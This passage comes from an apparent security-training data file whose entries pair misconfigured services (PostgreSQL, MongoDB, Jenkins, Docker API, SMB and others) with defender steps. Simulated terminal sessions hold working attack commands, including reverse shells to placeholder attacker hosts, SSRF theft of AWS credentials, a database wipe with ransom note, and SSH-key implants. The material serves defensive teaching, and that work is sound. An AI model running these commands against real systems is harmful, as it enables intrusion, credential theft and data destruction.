        whyAttackersCare:'Admin panels have the highest privilege level. Successful authentication gives the attacker direct control over application data, users, and often the underlying server.',
        objectives:['Initial Access','Privilege Escalation'],
        killChainStage:'Initial Access',
        mitreTactics:['TA0001'],
        mitreTechniques:[{id:'T1133',name:'External Remote Services'},{id:'T1078',name:'Valid Accounts'}],
        realWorld:'WordPress wp-admin, phpMyAdmin, and Kibana dashboards are massively indexed by Shodan. Automated credential-stuffing tools target these paths continuously.',
        defenderSteps:[
            {priority:'critical',action:'Restrict admin interfaces to internal IP ranges or VPN — use firewall ACLs'},
            {priority:'critical',action:'Rename admin paths where possible (wp-admin → custom path)'},
            {priority:'high',action:'Implement MFA on all admin interfaces'},
            {priority:'high',action:'Rate-limit login attempts — 5 failures → CAPTCHA → lockout'},
        ],
        interest:87, interestScore:87,
        learningObjective:'Understand why admin interfaces require additional access controls beyond authentication alone.',
        tags:['admin-panel','exposure','brute-force','web'],
        terminal:[
            {type:'command',content:'nuclei -target https://target.com -tags panel',annotation:'Discover exposed admin panels with automated scanner'},
            {type:'output',content:'[panel:phpmyadmin] https://target.com/phpmyadmin\n[panel:kibana] https://target.com:5601\n[panel:kubernetes-dashboard] https://target.com:8001/ui'},
        ],
    },
    {
        id:'COMBO-017', tier:'beginner', service:'PostgreSQL', port:5432,
        name:'PostgreSQL + Default Credentials',
        misconfig:'User postgres with password "postgres"',
        tagline:'The default DBA account with the default password.',
        overview:'PostgreSQL\'s default superuser account "postgres" often retains its default password in development-to-production migrations. Attackers authenticate with postgres:postgres, gain superuser access, and can execute system commands via COPY TO/FROM PROGRAM.',
        whyAttackersCare:'PostgreSQL superuser with COPY TO/FROM PROGRAM enables OS-level command execution without any additional exploit. The database becomes a full system shell.',
        objectives:['Initial Access','Execution','Privilege Escalation'],
        killChainStage:'Initial Access',
        mitreTactics:['TA0001','TA0002'],
        mitreTechniques:[{id:'T1078.001',name:'Valid Accounts: Default Accounts'},{id:'T1059',name:'Command and Scripting Interpreter'}],
        realWorld:'PostgreSQL default credentials are included in all major password list brute-force tools. Commonly found in cloud deployments where developers migrate dev databases to production.',
        defenderSteps:[
            {priority:'critical',action:'ALTER USER postgres PASSWORD \'<strong-random-password>\';'},
            {priority:'critical',action:'Bind PostgreSQL to 127.0.0.1 — never expose port 5432 to the internet'},
            {priority:'high',action:'Revoke SUPERUSER from application database users — use least-privilege accounts'},
        ],
        interest:78, interestScore:78,
        learningObjective:'Understand how database superuser accounts with default credentials enable both data access and OS-level command execution.',
        tags:['postgresql','database','default-creds','rce'],
        terminal:[
            {type:'command',content:'psql -h 1.2.3.4 -U postgres -W',annotation:'Connect with default superuser credentials'},
            {type:'output',content:'Password: postgres\npsql (14.2)\npostgres=# \\l\n  ecommerce_db | postgres | UTF8\n  user_auth_db | postgres | UTF8'},
            {type:'command',content:"COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/attacker/4444 0>&1';",annotation:'Execute reverse shell via COPY TO PROGRAM'},
        ],
    },
    {
        id:'COMBO-018', tier:'beginner', service:'MongoDB', port:27017,
        name:'MongoDB + No Authentication',
        misconfig:'MongoDB started without --auth flag',
        tagline:'The database that ransomware bots wipe within hours of exposure.',
        overview:'MongoDB without authentication allows any client to connect, read, write, and delete all databases. Automated ransomware bots scan for unauthenticated MongoDB, dump or delete the data, and leave a ransom note.',
        whyAttackersCare:'Unauthenticated MongoDB is immediately weaponizable. Ransom bots delete all data and demand payment for "recovery" — often with no actual backup.',
        objectives:['Collection','Impact','Exfiltration'],
        killChainStage:'Impact',
        mitreTactics:['TA0009','TA0040'],
        mitreTechniques:[{id:'T1485',name:'Data Destruction'},{id:'T1486',name:'Data Encrypted for Impact'}],
        realWorld:'The "MongoDB Apocalypse" (2017) saw 28,000+ databases wiped in days by automated bots. Hundreds of thousands of MongoDB instances remain exposed on Shodan today.',
        defenderSteps:[
            {priority:'critical',action:'Enable authentication: mongod --auth (or security.authorization: enabled in mongod.conf)'},
            {priority:'critical',action:'Bind to 127.0.0.1 — block port 27017 at firewall'},
            {priority:'critical',action:'Create admin users with strong passwords before enabling auth'},
        ],
        interest:92, interestScore:92,
        learningObjective:'Understand why "secure by default" matters and how automated bots exploit misconfigured databases at global scale.',
        tags:['mongodb','database','no-auth','ransomware','data-destruction'],
        terminal:[
            {type:'command',content:'mongo 1.2.3.4:27017',annotation:'Connect to MongoDB — no credentials required'},
            {type:'output',content:'MongoDB shell version v4.4.6\n> show dbs\necommerce_prod  2.8 GB\nuser_accounts   892 MB\nPayment_archive 4.1 GB'},
            {type:'command',content:'> use ecommerce_prod\n> db.dropDatabase()',annotation:'Ransom bot deletes entire database'},
            {type:'output',content:'{ "dropped" : "ecommerce_prod", "ok" : 1 }\n> db.PLEASE_READ.insert({note: "Your data has been backed up. Pay 0.05 BTC to recover."})'},
        ],
    },

    // ─── INTERMEDIATE (20) ─────────────────────────────────────
    {
        id:'COMBO-019', tier:'intermediate', service:'SMB', port:445,
        name:'SMBv1 + EternalBlue Exposure',
        misconfig:'SMBv1 Protocol Active (MS17-010)',
        tagline:'The vulnerability behind WannaCry and NotPetya.',
        overview:'SMBv1 contains the MS17-010 vulnerability exploited by the NSA\'s EternalBlue tool. WannaCry and NotPetya used this to propagate across hundreds of thousands of systems in hours. Systems with SMBv1 enabled are wormable.',
        whyAttackersCare:'EternalBlue provides unauthenticated Remote Code Execution. Combined with DoublePulsar for kernel shellcode injection, it delivers SYSTEM-level access without credentials.',
        objectives:['Initial Access','Lateral Movement','Execution'],
        killChainStage:'Initial Access',
        mitreTactics:['TA0001','TA0008'],
        mitreTechniques:[{id:'T1210',name:'Exploitation of Remote Services'},{id:'T1570',name:'Lateral Tool Transfer'}],
        realWorld:'WannaCry (2017) — 230,000+ systems in 150 countries in 24 hours. NotPetya (2017) — $10 billion in damages. Both leveraged EternalBlue on SMBv1.',
        defenderSteps:[
            {priority:'critical',action:'Disable SMBv1: Set-SmbServerConfiguration -EnableSMB1Protocol $false'},
            {priority:'critical',action:'Apply MS17-010 patch immediately on all Windows systems'},
            {priority:'critical',action:'Block port 445 at internet perimeter — SMB should never be externally accessible'},
        ],
        interest:99, interestScore:99,
        learningObjective:'Understand how a single protocol version creates wormable, unauthenticated RCE and why legacy protocol support is a critical security risk.',
        tags:['smb','eternalblue','wormable','wannacry','notpetya'],
        terminal:[
            {type:'command',content:'nmap -p 445 --script smb-vuln-ms17-010 1.2.3.4',annotation:'Check if target is vulnerable to EternalBlue'},
            {type:'output',content:'445/tcp open  microsoft-ds\n| smb-vuln-ms17-010:\n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1\n|     State: VULNERABLE\n|     Risk factor: HIGH\n|     CVE: CVE-2017-0144 (EternalBlue)'},
            {type:'command',content:'python eternalblue.py 1.2.3.4 shellcode/wannacry.bin',annotation:'Execute EternalBlue — unauthenticated SYSTEM shell'},
            {type:'output',content:'[+] Target OS: Windows Server 2008 R2\n[+] SMBv1 active — vulnerable\n[+] SYSTEM shell spawned\nC:\\Windows\\system32>whoami\nnt authority\\system'},
        ],
    },
    {
        id:'COMBO-020', tier:'intermediate', service:'LDAP', port:389,
        name:'LDAP + Anonymous Bind',
        misconfig:'LDAP Anonymous Bind Allowed',
        tagline:'The entire Active Directory user database — no credentials needed.',
        overview:'LDAP servers that allow anonymous bind connections permit unauthenticated enumeration of all Active Directory objects: users, groups, computers, and Group Policy. This intelligence is used to plan targeted attacks.',
        whyAttackersCare:'Anonymous LDAP provides a complete organizational chart — all usernames, email addresses, group memberships, and service account names — eliminating the reconnaissance phase entirely.',
        objectives:['Discovery','Credential Access'],
        killChainStage:'Reconnaissance',
        mitreTactics:['TA0007','TA0006'],
        mitreTechniques:[{id:'T1087.002',name:'Account Discovery: Domain Account'},{id:'T1069.002',name:'Permission Groups Discovery: Domain Groups'}],
        realWorld:'Used by APT groups and initial access brokers to enumerate AD topology before targeted phishing or Kerberoasting attacks.',
        defenderSteps:[
            {priority:'critical',action:'Disable anonymous LDAP bind in Active Directory: deny the ANONYMOUS LOGON from querying LDAP'},
            {priority:'high',action:'Enable LDAP signing and channel binding (KB4520412)'},
            {priority:'medium',action:'Monitor for unauthenticated LDAP queries in AD logs'},
        ],
        interest:78, interestScore:78,
        learningObjective:'Understand how directory service misconfigurations expose organizational intelligence without requiring any credentials.',
        tags:['ldap','active-directory','enumeration','recon'],
        terminal:[
            {type:'command',content:"ldapsearch -x -H ldap://dc.target.com -b 'DC=target,DC=com' '(objectClass=user)' sAMAccountName mail",annotation:'Anonymous LDAP query for all user accounts'},
            {type:'output',content:'# john.doe, Users, target.com\ndn: CN=john.doe,OU=Users,DC=target,DC=com\nsAMAccountName: john.doe\nmail: john.doe@target.com\n\n# svc_backup, Service Accounts, target.com\nsAMAccountName: svc_backup\n\n[847 entries returned]'},
            {type:'annotation',content:'// All 847 usernames collected. svc_backup is a service account — ideal Kerberoasting target.'},
        ],
    },
    {
        id:'COMBO-021', tier:'intermediate', service:'WinRM', port:5985,
        name:'WinRM + Weak Credentials',
        misconfig:'WinRM HTTP Enabled with Weak Password',
        tagline:'Remote PowerShell execution over the network.',
        overview:'Windows Remote Management (WinRM) enables remote PowerShell sessions. Exposed with weak or default credentials, it provides the attacker with a full PowerShell shell — equivalent to interactive local access.',
        whyAttackersCare:'WinRM is a native Windows management protocol. Using it for lateral movement blends in with normal administrative traffic and evades many security tools.',
        objectives:['Initial Access','Lateral Movement','Execution'],
        killChainStage:'Lateral Movement',
        mitreTactics:['TA0001','TA0008'],
        mitreTechniques:[{id:'T1021.006',name:'Remote Services: Windows Remote Management'},{id:'T1059.001',name:'Command and Scripting: PowerShell'}],
        realWorld:'Ransomware operators use WinRM for lateral movement after initial compromise. Living-off-the-land attack chains frequently use Evil-WinRM for post-exploitation.',
        defenderSteps:[
            {priority:'critical',action:'Enforce strong passwords and MFA for all WinRM-accessible accounts'},
            {priority:'critical',action:'Disable WinRM HTTP (5985) — mandate HTTPS (5986) with client certificates'},
            {priority:'high',action:'Restrict WinRM access to admin workstations only via firewall rules'},
        ],
        interest:86, interestScore:86,
        learningObjective:'Understand how legitimate management protocols become lateral movement vectors when credential hygiene fails.',
        tags:['winrm','powershell','lateral-movement','windows'],
        terminal:[
            {type:'command',content:'evil-winrm -i 192.168.1.100 -u administrator -p Password123',annotation:'Connect to WinRM with weak credentials'},
            {type:'output',content:'Evil-WinRM shell v3.4\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\Administrator> whoami\ntarget\\administrator'},
        ],
    },
    {
        id:'COMBO-022', tier:'intermediate', service:'RDP', port:3389,
        name:'RDP + No MFA',
        misconfig:'MFA Not Enforced on Remote Desktop',
        tagline:'One stolen password away from a full Windows desktop.',
        overview:'RDP without MFA means a single credential compromise — from phishing, password reuse, or data breach — immediately yields full desktop access. MFA would require the attacker to also control the victim\'s second factor.',
        whyAttackersCare:'MFA eliminates a huge percentage of credential-based initial access. Without it, a single password is sufficient for complete system takeover via RDP.',
        objectives:['Initial Access'],
        killChainStage:'Initial Access',
        mitreTactics:['TA0001'],
        mitreTechniques:[{id:'T1133',name:'External Remote Services'},{id:'T1078',name:'Valid Accounts'}],
        realWorld:'The majority of ransomware initial access via RDP involves credentials stolen from phishing or credential stuffing attacks — where MFA would have blocked access.',
        defenderSteps:[
            {priority:'critical',action:'Enforce MFA using Azure AD Conditional Access, Duo, or equivalent for all RDP access'},
            {priority:'critical',action:'Require RDP connections only via VPN or Azure Bastion — never direct internet exposure'},
            {priority:'high',action:'Enable Network Level Authentication (NLA) as minimum authentication control'},
        ],
        interest:94, interestScore:94,
        learningObjective:'Understand why MFA is not optional for internet-facing authentication and how its absence collapses defense-in-depth.',
        tags:['rdp','mfa','credential-theft','ransomware'],
        terminal:[
            {type:'command',content:"xfreerdp /v:target.com /u:alice /p:'phished_password' /cert-ignore",annotation:'Connect with phished credential — no second factor required'},
            {type:'output',content:'[INFO] Connecting to target.com:3389\n[INFO] Authentication successful\n[Desktop session opens — Alice\'s Windows desktop]'},
            {type:'annotation',content:'// MFA would have stopped this here. The phished password alone is sufficient for full access.'},
        ],
    },
    {
        id:'COMBO-023', tier:'intermediate', service:'SSH', port:22,
        name:'SSH + No Rate Limiting',
        misconfig:'No Account Lockout / No fail2ban / Unlimited Login Attempts',
        tagline:'Automated brute-force with thousands of attempts per minute.',
        overview:'SSH servers without login rate limiting allow brute-force tools to make thousands of authentication attempts per minute. Given enough time and a common password list, attackers will eventually find a valid credential.',
        whyAttackersCare:'Rate limiting is the primary defense against credential brute-force. Without it, online brute-force attacks against SSH are a reliable, automated technique.',
        objectives:['Credential Access','Initial Access'],
        killChainStage:'Initial Access',
        mitreTactics:['TA0006','TA0001'],
        mitreTechniques:[{id:'T1110.003',name:'Brute Force: Password Spraying'},{id:'T1110.001',name:'Brute Force: Password Guessing'}],
        realWorld:'SSH brute-force botnets (Mirai variants, Xorddos) scan all of IPv4 space daily targeting common usernames and passwords on port 22.',
        defenderSteps:[
            {priority:'critical',action:'Install fail2ban — ban IPs after 5 failed attempts for 1 hour'},
            {priority:'critical',action:'Disable password authentication entirely — use SSH key pairs only'},
            {priority:'high',action:'Use AllowUsers directive to restrict which users can SSH in'},
        ],
        interest:76, interestScore:76,
        learningObjective:'Understand why rate limiting is a critical compensating control for any authentication endpoint exposed to the internet.',
        tags:['ssh','brute-force','rate-limiting','botnet'],
        terminal:[
            {type:'command',content:'hydra -L /wordlists/usernames.txt -P /wordlists/rockyou.txt -t 64 ssh://10.0.0.5',annotation:'64 parallel threads — thousands of attempts/minute with no lockout'},
            {type:'output',content:'[STATUS] 3220.00 tries/min\n[22][ssh] host: 10.0.0.5   login: ubuntu   password: ubuntu123\nSession completed.'},
        ],
    },
    {
        id:'COMBO-024', tier:'intermediate', service:'Elasticsearch', port:9200,
        name:'Elasticsearch + No Authentication',
        misconfig:'xpack.security.enabled: false (default in older versions)',
        tagline:'Petabytes of data indexed and searchable — without a password.',
        overview:'Elasticsearch clusters without authentication expose all stored data to unauthenticated HTTP requests. Data is fully searchable, downloadable, and deletable. Shodan indexes new unauthenticated clusters within minutes of exposure.',
        whyAttackersCare:'Elasticsearch is often used as the backend for application logging, user analytics, and security events. A single unauthenticated query returns millions of records instantly.',
        objectives:['Discovery','Collection','Exfiltration'],
        killChainStage:'Collection',
        mitreTactics:['TA0009','TA0010'],
        mitreTechniques:[{id:'T1530',name:'Data from Cloud Storage'},{id:'T1048',name:'Exfiltration Over Alt Protocol'}],
        realWorld:'700 million LinkedIn records, 500 million Facebook records, and hundreds of healthcare breaches traced to unauthenticated Elasticsearch clusters. Meow bot (2020) wiped 4,000+ clusters in days.',
        defenderSteps:[
            {priority:'critical',action:'Enable X-Pack security: xpack.security.enabled: true in elasticsearch.yml'},
            {priority:'critical',action:'Bind to private interface only — block port 9200 at firewall'},
            {priority:'critical',action:'Set strong TLS between nodes and from clients'},
        ],
        interest:91, interestScore:91,
        learningObjective:'Understand how cloud-native data stores require explicit security configuration — "open by default" is an architectural risk.',
        tags:['elasticsearch','no-auth','data-breach','cloud'],
        terminal:[
            {type:'command',content:'curl http://1.2.3.4:9200/_cat/indices?v',annotation:'List all Elasticsearch indices — no credentials'},
            {type:'output',content:'health status index         docs.count store.size\ngreen  open   user_events   48,291,033   92.4gb\ngreen  open   app_logs      892,100,441  1.4tb\ngreen  open   security_logs 12,881,022   8.1gb'},
            {type:'command',content:"curl 'http://1.2.3.4:9200/user_events/_search?size=1000&q=*'",annotation:'Dump 1000 user records'},
        ],
    },
    {
        id:'COMBO-025', tier:'intermediate', service:'Jenkins', port:8080,
        name:'Jenkins + Script Console Enabled',
        misconfig:'Groovy Script Console Accessible (Manage Jenkins → Script Console)',
        tagline:'A web form that executes arbitrary code on your build server.',
        overview:'Jenkins\'s Groovy Script Console allows executing arbitrary Groovy (JVM) code on the Jenkins master. If this console is accessible — especially without strong authentication — attackers gain immediate RCE as the Jenkins service user.',
        whyAttackersCare:'Jenkins has access to all source code, deployment credentials, cloud provider keys, and production deployment pipelines. Compromising Jenkins means compromising everything it builds and deploys.',
        objectives:['Initial Access','Execution','Collection','Persistence'],
        killChainStage:'Execution',
        mitreTactics:['TA0001','TA0002'],
        mitreTechniques:[{id:'T1059.007',name:'Command and Scripting: JavaScript'},{id:'T1552.001',name:'Credentials in Files'}],
        realWorld:'APT groups and ransomware affiliates specifically target CI/CD systems. Jenkins compromise = access to production deployment keys, AWS IAM credentials, and all secrets in build pipelines.',
        defenderSteps:[
            {priority:'critical',action:'Restrict Script Console access to Jenkins admins only — or disable entirely if not needed'},
            {priority:'critical',action:'Never expose Jenkins to the internet — firewall to internal network or VPN only'},
            {priority:'critical',action:'Implement Jenkins role-based access control (RBAC) plugin'},
            {priority:'high',action:'Store secrets in a dedicated vault (HashiCorp Vault, AWS Secrets Manager) not in Jenkins config'},
        ],
        interest:96, interestScore:96,
        learningObjective:'Understand how CI/CD system compromise provides a path to all production systems through deployed credentials and pipeline access.',
        tags:['jenkins','cicd','rce','script-console'],
        terminal:[
            {type:'command',content:'# Navigate to: http://jenkins.target.com:8080/script',annotation:'Access Jenkins Script Console directly via URL'},
            {type:'output',content:'[Jenkins Groovy Script Console loaded — no auth required]'},
            {type:'command',content:"['bash', '-c', 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'].execute()",annotation:'Execute reverse shell via Groovy'},
            {type:'output',content:'# attacker@kali receives shell:\njenkins@build-server:~$ cat ~/.aws/credentials\n[default]\naws_access_key_id = AKIA...\naws_secret_access_key = wJalrX...'},
        ],
    },
    {
        id:'COMBO-026', tier:'intermediate', service:'Docker API', port:2375,
        name:'Docker API + No TLS Authentication',
        misconfig:'Docker Daemon Exposed on TCP 2375 Without TLS',
        tagline:'Create a root container — own the host.',
        overview:'The Docker API exposed on port 2375 without TLS allows any client to create, manage, and delete containers. Attackers create a privileged container with the host filesystem mounted, achieving full root access to the underlying host.',
        whyAttackersCare:'Unauthenticated Docker API is a direct path from network access to root shell on the host. No exploit needed — just standard Docker API calls.',
        objectives:['Initial Access','Privilege Escalation','Persistence'],
        killChainStage:'Privilege Escalation',
        mitreTactics:['TA0001','TA0004'],
        mitreTechniques:[{id:'T1610',name:'Deploy Container'},{id:'T1611',name:'Escape to Host'}],
        realWorld:'TeamTNT and Kinsing cryptominer campaigns specifically target exposed Docker APIs at mass scale. Complete host compromise is automated in seconds.',
        defenderSteps:[
            {priority:'critical',action:'Never expose Docker socket on TCP — use Unix socket only (/var/run/docker.sock)'},
            {priority:'critical',action:'If TCP access is required: enforce mutual TLS (client + server certificates)'},
            {priority:'critical',action:'Block port 2375 at firewall unconditionally'},
        ],
        interest:95, interestScore:95,
        learningObjective:'Understand how container orchestration API exposure creates a direct path to host-level compromise through container privilege escalation.',
        tags:['docker','container','api','rce','teamtnt'],
        terminal:[
            {type:'command',content:'docker -H tcp://1.2.3.4:2375 run -v /:/hostfs --rm -it alpine chroot /hostfs sh',annotation:'Mount host filesystem in privileged container'},
            {type:'output',content:'/ # whoami\nroot\n/ # cat /etc/shadow\nroot:$6$...\n/ # cat /root/.ssh/authorized_keys\n/ # echo "attacker-key" >> /root/.ssh/authorized_keys'},
        ],
    },
    {
        id:'COMBO-027', tier:'intermediate', service:'NFS', port:2049,
        name:'NFS + World-Readable Exports',
        misconfig:"NFS Export with *(rw,no_root_squash)",
        tagline:'Mount internal file shares from anywhere on the network.',
        overview:'NFS exports configured with a wildcard (*) allow any client to mount the share. With no_root_squash, the remote root user is treated as local root. Attackers mount the export and access or modify any file, including adding SSH keys.',
        whyAttackersCare:'An NFS share with no_root_squash and wildcard access allows full filesystem manipulation — adding SSH keys, modifying cron jobs, or reading configuration files for credentials.',
        objectives:['Discovery','Collection','Persistence'],
        killChainStage:'Persistence',
        mitreTactics:['TA0003','TA0009'],
        mitreTechniques:[{id:'T1005',name:'Data from Local System'},{id:'T1098.004',name:'SSH Authorized Keys'}],
        realWorld:'Common finding in enterprise Linux environments and cloud NFS misconfigurations. Frequently discovered during internal penetration tests after initial foothold.',
        defenderSteps:[
            {priority:'critical',action:"Replace * with specific trusted IP ranges in /etc/exports"},
            {priority:'critical',action:"Add root_squash to all NFS exports — never use no_root_squash"},
            {priority:'high',action:'Block port 2049 from internet — NFS is for internal use only'},
        ],
        interest:73, interestScore:73,
        learningObjective:'Understand how network file system misconfiguration allows lateral movement through file system access without exploiting any vulnerability.',
        tags:['nfs','file-share','lateral-movement','linux'],
        terminal:[
            {type:'command',content:'showmount -e 192.168.1.20',annotation:'Enumerate NFS exports'},
            {type:'output',content:'Export list for 192.168.1.20:\n/home/backups *(rw,no_root_squash)'},
            {type:'command',content:'mount -o rw 192.168.1.20:/home/backups /mnt/nfs',annotation:'Mount the NFS share as root'},
            {type:'command',content:'echo "attacker-ssh-key" >> /mnt/nfs/../../../root/.ssh/authorized_keys',annotation:'Add SSH key via NFS — no_root_squash means we write as root'},
        ],
    },
    {
        id:'COMBO-028', tier:'intermediate', service:'HTTP', port:80,
        name:'HTTP + SQL Injection',
        misconfig:'Unparameterized Database Queries (No Prepared Statements)',
        tagline:'User input goes directly into SQL queries. The entire database is one request away.',
        overview:'SQL injection occurs when user input is concatenated into SQL queries without parameterization. Attackers manipulate query logic to dump entire databases, bypass authentication, and — on some databases — execute OS commands.',
        whyAttackersCare:'SQL injection provides direct access to the database without any credential. On MSSQL with xp_cmdshell enabled, SQLi leads immediately to OS-level code execution.',
        objectives:['Credential Access','Collection','Execution'],
        killChainStage:'Execution',
        mitreTactics:['TA0006','TA0009'],
        mitreTechniques:[{id:'T1190',name:'Exploit Public-Facing Application'},{id:'T1005',name:'Data from Local System'}],
        realWorld:'SQL injection remains one of the most common web vulnerabilities (OWASP Top 10 #3). Major breaches including Yahoo (2012), Sony Pictures, and TalkTalk involved SQLi.',
        defenderSteps:[
            {priority:'critical',action:'Use parameterized queries / prepared statements — never concatenate user input into SQL'},
            {priority:'critical',action:'Use an ORM (SQLAlchemy, Hibernate, ActiveRecord) that handles parameterization automatically'},
            {priority:'high',action:'Apply least-privilege to database accounts — app user should not have DBA rights'},
            {priority:'medium',action:'Deploy a WAF with SQLi detection rules as a defense-in-depth layer'},
        ],
        interest:88, interestScore:88,
        learningObjective:'Understand why input sanitization is foundational and how missing parameterization creates a direct path to complete database compromise.',
        tags:['sqli','web','database','input-validation'],
        terminal:[
            {type:'command',content:"sqlmap -u 'http://target.com/user?id=1' --dbs --batch",annotation:'Automated SQL injection detection and database enumeration'},
            {type:'output',content:'[INFO] GET parameter \'id\' is injectable\n[INFO] the back-end DBMS is MySQL\navailable databases [3]:\n[*] information_schema\n[*] ecommerce_db\n[*] user_auth'},
            {type:'command',content:"sqlmap -u 'http://target.com/user?id=1' -D user_auth -T users --dump",annotation:'Dump the users table'},
            {type:'output',content:'username | password_hash | email\n─────────────────────────────────────────────\nadmin    | $2b$12$xyz... | admin@target.com\nalice    | $2b$12$abc... | alice@target.com\n[4,281 rows dumped]'},
        ],
    },
    {
        id:'COMBO-029', tier:'intermediate', service:'HTTP', port:80,
        name:'HTTP + SSRF to Internal Metadata',
        misconfig:'No SSRF Protection + IMDSv1 Cloud Metadata',
        tagline:'The web server fetches URLs for you — including internal cloud metadata.',
        overview:'Server-Side Request Forgery (SSRF) occurs when an attacker controls a URL that the server fetches internally. On cloud infrastructure (AWS, GCP, Azure), SSRF to the metadata endpoint (169.254.169.254) exposes IAM credentials for the cloud provider.',
        whyAttackersCare:'SSRF to cloud metadata yields temporary IAM credentials that provide access to all cloud services the instance is authorized for — S3 buckets, databases, Lambda functions, and more.',
        objectives:['Discovery','Credential Access','Lateral Movement'],
        killChainStage:'Credential Access',
        mitreTactics:['TA0006','TA0009'],
        mitreTechniques:[{id:'T1552.005',name:'Cloud Instance Metadata API'},{id:'T1190',name:'Exploit Public-Facing Application'}],
        realWorld:'Capital One breach (2019) — SSRF to AWS metadata endpoint leaked IAM credentials, exposing 100 million customer records. One of the most costly SSRF incidents on record.',
        defenderSteps:[
            {priority:'critical',action:'Enable IMDSv2 on all AWS instances (requires session tokens — blocks SSRF)'},
            {priority:'critical',action:'Validate and allowlist URLs for any server-side fetch functionality'},
            {priority:'high',action:'Block access to 169.254.169.254 from application security groups at cloud network layer'},
        ],
        interest:82, interestScore:82,
        learningObjective:'Understand how web application vulnerabilities pivot to cloud infrastructure compromise through the metadata API.',
        tags:['ssrf','cloud','aws','metadata','iam'],
        terminal:[
            {type:'command',content:"curl 'http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",annotation:'SSRF to AWS metadata endpoint'},
            {type:'output',content:'EC2-Prod-Role'},
            {type:'command',content:"curl 'http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Prod-Role'",annotation:'Retrieve IAM credentials'},
            {type:'output',content:'{\n  "AccessKeyId": "ASIA...",\n  "SecretAccessKey": "wJalr...",\n  "Token": "IQoJb3...",\n  "Expiration": "2024-01-15T22:00:00Z"\n}'},
        ],
    },
    {
        id:'COMBO-030', tier:'intermediate', service:'DNS', port:53,
        name:'DNS + Zone Transfer Allowed',
        misconfig:'AXFR Allowed from Any Source',
        tagline:'Every internal hostname, IP, and subdomain — in one request.',
        overview:'DNS zone transfer (AXFR) is designed for replicating DNS records between servers. When allowed from any source, attackers retrieve a complete map of all internal hostnames, IP addresses, mail servers, and subdomains in seconds.',
        whyAttackersCare:'A complete DNS zone is the foundation for targeted reconnaissance — identifying internal servers, admin interfaces, development systems, and naming patterns for password guessing.',
        objectives:['Discovery'],
        killChainStage:'Reconnaissance',
        mitreTactics:['TA0043'],
        mitreTechniques:[{id:'T1590.002',name:'Gather Victim Network Information: DNS'}],
        realWorld:'Zone transfer is commonly the first step in external penetration tests, revealing internal network topology. Often found on legacy DNS configurations.',
        defenderSteps:[
            {priority:'critical',action:'Restrict AXFR to specific authorised DNS server IPs only in BIND/Windows DNS'},
            {priority:'high',action:'Implement TSIG (Transaction Signature) for authenticated zone transfers'},
            {priority:'medium',action:'Use split-horizon DNS — internal hostnames should never be in external zones'},
        ],
        interest:74, interestScore:74,
        learningObjective:'Understand how DNS infrastructure misconfiguration provides complete network topology without any active scanning.',
        tags:['dns','zone-transfer','recon','internal-network'],
        terminal:[
            {type:'command',content:'dig @ns1.target.com target.com AXFR',annotation:'Request full DNS zone transfer'},
            {type:'output',content:'; Zone transfer for target.com\ntarget.com.        SOA   ns1.target.com.\ndev.target.com.    A     10.0.1.50\nstaging.target.com A     10.0.1.51\ndb-master.target.com A   10.0.2.10\nvpn.target.com     A     1.2.3.100\nadmin.target.com   A     10.0.3.5\n[142 records transferred]'},
        ],
    },
    {
        id:'COMBO-031', tier:'intermediate', service:'Memcached', port:11211,
        name:'Memcached + UDP Exposure',
        misconfig:'Memcached Exposed on UDP Port 11211 (No Auth)',
        tagline:'A 50,000x amplification factor — the most powerful DDoS vector.',
        overview:'Memcached exposed on UDP with no authentication provides a 50,000x DDoS amplification vector. Attackers send small spoofed requests; Memcached responds with massive data bursts to the victim\'s IP. It also exposes all cached data.',
        whyAttackersCare:'A single 15-byte request can generate a 750KB response directed at a victim. GitHub (2018) suffered 1.3 Tbps DDoS attack via Memcached amplification — the largest ever recorded at that time.',
        objectives:['Impact','Collection'],
        killChainStage:'Impact',
        mitreTactics:['TA0040'],
        mitreTechniques:[{id:'T1498.002',name:'Network Denial of Service: Reflection Amplification'}],
        realWorld:'GitHub 1.3 Tbps DDoS (2018). Multiple ISPs reported sustained amplification attacks via Memcached in 2018 affecting major cloud providers.',
        defenderSteps:[
            {priority:'critical',action:'Block UDP port 11211 at firewall — Memcached should never be internet-accessible'},
            {priority:'critical',action:'Bind Memcached to 127.0.0.1 only'},
            {priority:'high',action:'If UDP is required internally, enable authentication (Memcached 1.5.6+)'},
        ],
        interest:72, interestScore:72,
        learningObjective:'Understand how protocol amplification creates massively disproportionate attack volume and why UDP services require strict network controls.',
        tags:['memcached','ddos','amplification','udp'],
        terminal:[
            {type:'command',content:"echo -e '\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00stats\\r\\n' | nc -u -q1 1.2.3.4 11211",annotation:'Query Memcached stats — unauthenticated UDP'},
            {type:'output',content:'STAT pid 1234\nSTAT uptime 86400\nSTAT curr_items 4829100\nSTAT bytes 8,291,882,944\n[8.3 GB cached data accessible]'},
        ],
    },
    {
        id:'COMBO-032', tier:'intermediate', service:'SMB', port:445,
        name:'SMB + NTLM Relay (SMB Signing Disabled)',
        misconfig:'SMB Signing Not Required on Domain Members',
        tagline:'Intercept an authentication handshake and replay it as the victim.',
        overview:'When SMB signing is not enforced, an attacker who can perform a man-in-the-middle attack can capture NTLM authentication handshakes and relay them to other services — authenticating as the victim user without ever cracking the hash.',
        whyAttackersCare:'NTLM relay doesn\'t require cracking passwords. The attacker relays the authentication in real-time, impersonating domain users across multiple systems. Combined with Responder, it\'s highly automated.',
        objectives:['Credential Access','Lateral Movement'],
        killChainStage:'Credential Access',
        mitreTactics:['TA0006','TA0008'],
        mitreTechniques:[{id:'T1557.001',name:'Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning'},{id:'T1550.002',name:'Use Alternate Auth: Pass the Hash'}],
        realWorld:'Internal network penetration tests almost universally demonstrate NTLM relay when SMB signing is not enforced. A foundational Active Directory attack technique.',
        defenderSteps:[
            {priority:'critical',action:'Enforce SMB Signing on all domain controllers and member servers via GPO'},
            {priority:'critical',action:'Disable LLMNR and NBT-NS (prevent Responder poisoning)'},
            {priority:'high',action:'Enable Extended Protection for Authentication (EPA) for NTLM'},
        ],
        interest:87, interestScore:87,
        learningObjective:'Understand how authentication relay attacks bypass credential cracking entirely by impersonating authenticated users in real-time.',
